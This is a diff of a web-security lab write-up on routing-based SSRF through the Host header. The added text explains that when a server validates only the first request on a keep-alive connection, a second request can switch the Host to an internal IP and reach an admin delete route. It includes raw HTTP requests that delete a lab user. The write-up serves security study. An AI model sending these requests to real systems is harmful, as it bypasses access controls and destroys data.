@@ -1316,7 +1316,21 @@ X-Forwarded-Server: EXPLOIT.net
 
 ### HOST Connection State  
 
->Target is vulnerable to **routing-based SSRF** via the Host header, but validate connection state of the first request. Sending grouped request in sequence using **single connection** and setting the connection header to **keep-alive**, bypass host header validation and enable SSRF exploit of local server.  
+>Target is vulnerable to **routing-based SSRF** via the Host header, but validate connection state of the first request. Sending grouped request in sequence using **single connection** and setting the connection header to **keep-alive**, bypass host header validation and enable SSRF exploit of local server.
+
+>Example of SINGLE CONNECTION requests.
+
+First one has to be valid
+
+![correct](images/correct.png)
+
+Second one takes advantage of the same connection and changes host and path to bypass host validation and access private routes.
+
+![incorrect](images/incorrectAdmin.png)
+
+IDEA ==> review the response to the malicious request and see how to build a delete request for user `carlos`
+
+>So, final requests to delete user `carlos` are:
 
 ```html
 GET / HTTP/1.1
@@ -1331,7 +1345,7 @@ Connection: keep-alive
 
 ```html
 POST /admin/delete HTTP/1.1
-Host: localhost
+Host: 192.168.0.1
 Cookie: _lab=YOUR-LAB-COOKIE; session=YOUR-SESSION-COOKIE
 Content-Type: x-www-form-urlencoded
 Content-Length: 53
